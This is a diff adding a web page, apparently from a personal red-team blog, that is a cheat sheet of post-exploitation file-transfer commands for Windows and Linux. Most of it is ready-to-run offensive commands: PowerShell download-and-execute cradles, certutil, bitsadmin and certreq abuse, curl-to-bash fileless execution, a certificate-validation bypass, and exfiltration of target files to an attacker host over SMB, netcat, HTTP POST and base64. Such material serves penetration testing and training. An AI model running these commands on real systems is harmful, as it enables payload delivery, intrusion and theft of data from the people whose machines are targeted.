@@ -1,0 +1,395 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="File-Transfers"><a href="#File-Transfers" class="headerlink" title="File Transfers"></a>File Transfers</h1><p>Transfer files between attacker and target systems using various protocols and techniques for both Windows and Linux.<br>Essential for moving tools, exploits, and exfiltrating data during privilege escalation and post-exploitation phases.</p>
+<h2 id="Windows-File-Downloads"><a href="#Windows-File-Downloads" class="headerlink" title="Windows File Downloads"></a>Windows File Downloads</h2><h3 id="PowerShell-Web-Downloads"><a href="#PowerShell-Web-Downloads" class="headerlink" title="PowerShell Web Downloads"></a>PowerShell Web Downloads</h3><h4 id="Invoke-WebRequest-wget-curl-iwr"><a href="#Invoke-WebRequest-wget-curl-iwr" class="headerlink" title="Invoke-WebRequest (wget&#x2F;curl&#x2F;iwr)"></a>Invoke-WebRequest (wget&#x2F;curl&#x2F;iwr)</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download and save to disk</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/nc.exe <span class="literal">-OutFile</span> nc.exe</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/nc.exe <span class="literal">-OutFile</span> nc.exe</span><br><span class="line"><span class="built_in">iwr</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/nc.exe <span class="literal">-OutFile</span> nc.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download with UseBasicParsing (bypass IE first-run)</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/nc.exe <span class="literal">-UseBasicParsing</span> <span class="literal">-OutFile</span> nc.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download and execute in memory</span></span><br><span class="line"><span class="built_in">IEX</span>(<span class="built_in">iwr</span> <span class="literal">-Uri</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/script.ps1 <span class="literal">-UseBasicParsing</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom User-Agent</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/nc.exe <span class="literal">-UserAgent</span> [<span class="type">Microsoft.PowerShell.Commands.PSUserAgent</span>]::Chrome <span class="literal">-OutFile</span> nc.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="WebClient-Class"><a href="#WebClient-Class" class="headerlink" title="WebClient Class"></a>WebClient Class</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download to disk</span></span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;http://10.10.14.5/nc.exe&#x27;</span>,<span class="string">&#x27;nc.exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download and execute in memory</span></span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.5/script.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Async download</span></span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;http://10.10.14.5/nc.exe&#x27;</span>,<span class="string">&#x27;nc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Bypass-SSL-Certificate-Validation"><a href="#Bypass-SSL-Certificate-Validation" class="headerlink" title="Bypass SSL Certificate Validation"></a>Bypass SSL Certificate Validation</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = &#123;<span class="variable">$true</span>&#125;</span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;https://10.10.14.5/nc.exe&#x27;</span>,<span class="string">&#x27;nc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB-File-Transfers"><a href="#SMB-File-Transfers" class="headerlink" title="SMB File Transfers"></a>SMB File Transfers</h3><h4 id="Start-SMB-Server-Attacker"><a href="#Start-SMB-Server-Attacker" class="headerlink" title="Start SMB Server (Attacker)"></a>Start SMB Server (Attacker)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Anonymous SMB server</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-smbserver share $(<span class="built_in">pwd</span>) -smb2support</span><br><span class="line"></span><br><span class="line"><span class="comment"># Authenticated SMB server</span></span><br><span class="line"><span class="built_in">sudo</span> impacket-smbserver share $(<span class="built_in">pwd</span>) -smb2support -username user -password pass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Download-from-SMB-Target"><a href="#Download-from-SMB-Target" class="headerlink" title="Download from SMB (Target)"></a>Download from SMB (Target)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Anonymous access (older Windows)</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>\share\nc.exe nc.exe</span><br><span class="line"></span><br><span class="line"># Authenticated access</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>\share /user:user pass</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>\share\nc.exe nc.exe</span><br><span class="line"></span><br><span class="line"># Mount as network drive</span><br><span class="line"><span class="built_in">net</span> use n: \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>\share /user:user pass</span><br><span class="line"><span class="built_in">copy</span> n:\nc.exe nc.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="FTP-File-Transfers"><a href="#FTP-File-Transfers" class="headerlink" title="FTP File Transfers"></a>FTP File Transfers</h3><h4 id="Start-FTP-Server-Attacker"><a href="#Start-FTP-Server-Attacker" class="headerlink" title="Start FTP Server (Attacker)"></a>Start FTP Server (Attacker)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m pyftpdlib --port 21</span><br></pre></td></tr></table></figure>
+
+<h4 id="Download-via-FTP-Target"><a href="#Download-via-FTP-Target" class="headerlink" title="Download via FTP (Target)"></a>Download via FTP (Target)</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerShell FTP download</span></span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;ftp://10.10.14.5/nc.exe&#x27;</span>,<span class="string">&#x27;nc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">CMD</span> FTP with command file</span><br><span class="line"><span class="built_in">echo</span> open <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> &gt; ftpcommand.txt</span><br><span class="line"><span class="built_in">echo</span> USER anonymous &gt;&gt; ftpcommand.txt</span><br><span class="line"><span class="built_in">echo</span> anonymous &gt;&gt; ftpcommand.txt</span><br><span class="line"><span class="built_in">echo</span> binary &gt;&gt; ftpcommand.txt</span><br><span class="line"><span class="built_in">echo</span> GET nc.exe &gt;&gt; ftpcommand.txt</span><br><span class="line"><span class="built_in">echo</span> bye &gt;&gt; ftpcommand.txt</span><br><span class="line">ftp -v -n -s:ftpcommand.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Download file (detectable by AMSI)</span><br><span class="line">certutil.exe -urlcache -split -f http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/nc.exe nc.exe</span><br><span class="line">certutil.exe -verifyctl -split -f http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/nc.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Download with bitsadmin</span><br><span class="line">bitsadmin /transfer job /priority foreground http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>/nc.exe C:\Users\Public\nc.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerShell BitsTransfer</span></span><br><span class="line"><span class="built_in">Import-Module</span> bitstransfer</span><br><span class="line"><span class="built_in">Start-BitsTransfer</span> <span class="literal">-Source</span> <span class="string">&quot;http://10.10.14.5/nc.exe&quot;</span> <span class="literal">-Destination</span> <span class="string">&quot;C:\Users\Public\nc.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="RDP-File-Transfers"><a href="#RDP-File-Transfers" class="headerlink" title="RDP File Transfers"></a>RDP File Transfers</h3><h4 id="Mount-Local-Directory-via-RDP"><a href="#Mount-Local-Directory-via-RDP" class="headerlink" title="Mount Local Directory via RDP"></a>Mount Local Directory via RDP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Mount local folder when connecting</span></span><br><span class="line">xfreerdp /v:10.10.10.10 /u:user /p:pass /drive:share,/home/attacker/tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain-joined RDP</span></span><br><span class="line">xfreerdp /v:10.10.10.10 /u:<span class="string">&#x27;domain\user&#x27;</span> /p:pass /drive:share,/home/attacker/tools</span><br></pre></td></tr></table></figure>
+
+<h4 id="Copy-Files-via-RDP"><a href="#Copy-Files-via-RDP" class="headerlink" title="Copy Files via RDP"></a>Copy Files via RDP</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># On target, <span class="built_in">copy</span> from mounted share</span><br><span class="line"><span class="built_in">copy</span> \\tsclient\share\nc.exe nc.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Evil-WinRM-File-Transfers"><a href="#Evil-WinRM-File-Transfers" class="headerlink" title="Evil-WinRM File Transfers"></a>Evil-WinRM File Transfers</h3><h4 id="Upload-File"><a href="#Upload-File" class="headerlink" title="Upload File"></a>Upload File</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># From Evil-WinRM session</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; upload /opt/tools/nc.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="Download-File"><a href="#Download-File" class="headerlink" title="Download File"></a>Download File</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># From Evil-WinRM session</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; download C:\Users\user\file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Base64-Encoding-Clipboard-Transfer"><a href="#Base64-Encoding-Clipboard-Transfer" class="headerlink" title="Base64 Encoding (Clipboard Transfer)"></a>Base64 Encoding (Clipboard Transfer)</h3><h4 id="Encode-on-Attacker"><a href="#Encode-on-Attacker" class="headerlink" title="Encode on Attacker"></a>Encode on Attacker</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Encode file</span></span><br><span class="line"><span class="built_in">cat</span> nc.exe | <span class="built_in">base64</span> -w 0; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Decode-on-Target"><a href="#Decode-on-Target" class="headerlink" title="Decode on Target"></a>Decode on Target</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decode and write to file</span></span><br><span class="line">[<span class="type">IO.File</span>]::WriteAllBytes(<span class="string">&quot;C:\Users\Public\nc.exe&quot;</span>,[<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;&lt;base64_string&gt;&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="Verify-Integrity"><a href="#Verify-Integrity" class="headerlink" title="Verify Integrity"></a>Verify Integrity</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Attacker</span></span><br><span class="line"><span class="built_in">md5sum</span> nc.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Target</span></span><br><span class="line"><span class="built_in">Get-FileHash</span> C:\Users\Public\nc.exe <span class="literal">-Algorithm</span> MD5</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-File-Downloads"><a href="#Linux-File-Downloads" class="headerlink" title="Linux File Downloads"></a>Linux File Downloads</h2><h3 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download file</span></span><br><span class="line">wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download with custom headers</span></span><br><span class="line">wget --header=<span class="string">&quot;Authorization: Bearer token&quot;</span> http://10.10.14.5/file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download file</span></span><br><span class="line">curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download and execute</span></span><br><span class="line">curl http://10.10.14.5/script.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Follow redirects</span></span><br><span class="line">curl -L http://10.10.14.5/file.txt -o file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="SCP-SSH"><a href="#SCP-SSH" class="headerlink" title="SCP (SSH)"></a>SCP (SSH)</h3><h4 id="Start-SSH-Server-Attacker"><a href="#Start-SSH-Server-Attacker" class="headerlink" title="Start SSH Server (Attacker)"></a>Start SSH Server (Attacker)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start ssh</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> ssh</span><br><span class="line">netstat -lnpt | grep 22</span><br></pre></td></tr></table></figure>
+
+<h4 id="Download-via-SCP-Target"><a href="#Download-via-SCP-Target" class="headerlink" title="Download via SCP (Target)"></a>Download via SCP (Target)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download from attacker</span></span><br><span class="line">scp user@10.10.14.5:/path/to/file.txt /tmp/file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload to attacker</span></span><br><span class="line">scp /tmp/file.txt user@10.10.14.5:/path/to/destination/</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bash-dev-tcp"><a href="#Bash-dev-tcp" class="headerlink" title="Bash &#x2F;dev&#x2F;tcp"></a>Bash &#x2F;dev&#x2F;tcp</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Connect to web server</span></span><br><span class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/10.10.14.5/80</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send HTTP request</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;GET /file.txt HTTP/1.1\nHost: 10.10.14.5\n\n&quot;</span> &gt;&amp;3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read response</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&amp;3 &gt; file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 2</span></span><br><span class="line">python -c <span class="string">&#x27;import urllib; urllib.urlretrieve(&quot;http://10.10.14.5/file.txt&quot;, &quot;/tmp/file.txt&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3</span></span><br><span class="line">python3 -c <span class="string">&#x27;import urllib.request; urllib.request.urlretrieve(&quot;http://10.10.14.5/file.txt&quot;, &quot;/tmp/file.txt&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Fileless-Execution-Pipes"><a href="#Fileless-Execution-Pipes" class="headerlink" title="Fileless Execution (Pipes)"></a>Fileless Execution (Pipes)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Curl to bash</span></span><br><span class="line">curl http://10.10.14.5/script.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wget to bash</span></span><br><span class="line">wget -qO- http://10.10.14.5/script.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wget to python</span></span><br><span class="line">wget -qO- http://10.10.14.5/script.py | python3</span><br></pre></td></tr></table></figure>
+
+<h3 id="OpenSSL-File-Transfer"><a href="#OpenSSL-File-Transfer" class="headerlink" title="OpenSSL File Transfer"></a>OpenSSL File Transfer</h3><h4 id="Server-Attacker"><a href="#Server-Attacker" class="headerlink" title="Server (Attacker)"></a>Server (Attacker)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Generate certificate</span></span><br><span class="line">openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start server</span></span><br><span class="line">openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Client-Target"><a href="#Client-Target" class="headerlink" title="Client (Target)"></a>Client (Target)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download file</span></span><br><span class="line">openssl s_client -connect 10.10.14.5:80 -quiet &gt; linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-File-Uploads"><a href="#Windows-File-Uploads" class="headerlink" title="Windows File Uploads"></a>Windows File Uploads</h2><h3 id="PowerShell-Web-Upload"><a href="#PowerShell-Web-Upload" class="headerlink" title="PowerShell Web Upload"></a>PowerShell Web Upload</h3><h4 id="Start-Web-Server-with-Upload-Attacker"><a href="#Start-Web-Server-with-Upload-Attacker" class="headerlink" title="Start Web Server with Upload (Attacker)"></a>Start Web Server with Upload (Attacker)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python upload server</span></span><br><span class="line">python3 -m uploadserver <span class="number">8000</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Upload-via-PowerShell-Target"><a href="#Upload-via-PowerShell-Target" class="headerlink" title="Upload via PowerShell (Target)"></a>Upload via PowerShell (Target)</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Upload file</span></span><br><span class="line"><span class="built_in">Invoke-RestMethod</span> <span class="literal">-Uri</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>:<span class="number">8000</span>/upload <span class="literal">-Method</span> Post <span class="literal">-InFile</span> C:\Users\Public\file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB-Upload"><a href="#SMB-Upload" class="headerlink" title="SMB Upload"></a>SMB Upload</h3><h4 id="Upload-to-SMB-Share-Target"><a href="#Upload-to-SMB-Share-Target" class="headerlink" title="Upload to SMB Share (Target)"></a>Upload to SMB Share (Target)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">Copy</span> file to attacker&#x27;s SMB share</span><br><span class="line"><span class="built_in">copy</span> C:\Users\Public\file.txt \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>\share\file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Base64-Exfiltration"><a href="#Base64-Exfiltration" class="headerlink" title="Base64 Exfiltration"></a>Base64 Exfiltration</h3><h4 id="Encode-on-Target"><a href="#Encode-on-Target" class="headerlink" title="Encode on Target"></a>Encode on Target</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Encode file</span></span><br><span class="line">[<span class="type">Convert</span>]::ToBase64String([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;C:\Users\Public\file.txt&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h4 id="Decode-on-Attacker"><a href="#Decode-on-Attacker" class="headerlink" title="Decode on Attacker"></a>Decode on Attacker</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decode base64 string</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;base64_string&gt;&quot;</span> | <span class="built_in">base64</span> -d &gt; file.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Certreq-Upload-LOLBAS"><a href="#Certreq-Upload-LOLBAS" class="headerlink" title="Certreq Upload (LOLBAS)"></a>Certreq Upload (LOLBAS)</h3><h4 id="Start-Listener-Attacker"><a href="#Start-Listener-Attacker" class="headerlink" title="Start Listener (Attacker)"></a>Start Listener (Attacker)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nc -lvnp 8000</span><br></pre></td></tr></table></figure>
+
+<h4 id="Upload-via-Certreq-Target"><a href="#Upload-via-Certreq-Target" class="headerlink" title="Upload via Certreq (Target)"></a>Upload via Certreq (Target)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certreq.exe -Post -config http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>:<span class="number">8000</span>/ C:\Users\Public\file.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-File-Uploads"><a href="#Linux-File-Uploads" class="headerlink" title="Linux File Uploads"></a>Linux File Uploads</h2><h3 id="SCP-Upload"><a href="#SCP-Upload" class="headerlink" title="SCP Upload"></a>SCP Upload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Upload to attacker</span></span><br><span class="line">scp /tmp/file.txt user@10.10.14.5:/path/to/destination/</span><br></pre></td></tr></table></figure>
+
+<h3 id="Curl-Upload"><a href="#Curl-Upload" class="headerlink" title="Curl Upload"></a>Curl Upload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Upload via POST</span></span><br><span class="line">curl -X POST http://10.10.14.5:8000/upload -F <span class="string">&quot;file=@/tmp/file.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload with authentication</span></span><br><span class="line">curl -X POST http://10.10.14.5:8000/upload -F <span class="string">&quot;file=@/tmp/file.txt&quot;</span> -u user:pass</span><br></pre></td></tr></table></figure>
+
+<h3 id="Netcat-Upload"><a href="#Netcat-Upload" class="headerlink" title="Netcat Upload"></a>Netcat Upload</h3><h4 id="Listener-Attacker"><a href="#Listener-Attacker" class="headerlink" title="Listener (Attacker)"></a>Listener (Attacker)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444 &gt; received_file.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Send-File-Target"><a href="#Send-File-Target" class="headerlink" title="Send File (Target)"></a>Send File (Target)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/file.txt | nc 10.10.14.5 4444</span><br></pre></td></tr></table></figure>
+
+<h3 id="Base64-Exfiltration-1"><a href="#Base64-Exfiltration-1" class="headerlink" title="Base64 Exfiltration"></a>Base64 Exfiltration</h3><h4 id="Encode-on-Target-1"><a href="#Encode-on-Target-1" class="headerlink" title="Encode on Target"></a>Encode on Target</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/file.txt | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="Decode-on-Attacker-1"><a href="#Decode-on-Attacker-1" class="headerlink" title="Decode on Attacker"></a>Decode on Attacker</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;base64_string&gt;&quot;</span> | <span class="built_in">base64</span> -d &gt; file.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP-Servers-Attacker"><a href="#HTTP-Servers-Attacker" class="headerlink" title="HTTP Servers (Attacker)"></a>HTTP Servers (Attacker)</h2><h3 id="Python-HTTP-Server"><a href="#Python-HTTP-Server" class="headerlink" title="Python HTTP Server"></a>Python HTTP Server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 3</span></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2</span></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind to specific interface</span></span><br><span class="line">python3 -m http.server 8000 --<span class="built_in">bind</span> 10.10.14.5</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP-HTTP-Server"><a href="#PHP-HTTP-Server" class="headerlink" title="PHP HTTP Server"></a>PHP HTTP Server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:8000</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ruby-HTTP-Server"><a href="#Ruby-HTTP-Server" class="headerlink" title="Ruby HTTP Server"></a>Ruby HTTP Server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -run -ehttpd . -p8000</span><br></pre></td></tr></table></figure>
+
+<h3 id="Busybox-HTTP-Server"><a href="#Busybox-HTTP-Server" class="headerlink" title="Busybox HTTP Server"></a>Busybox HTTP Server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure>
+
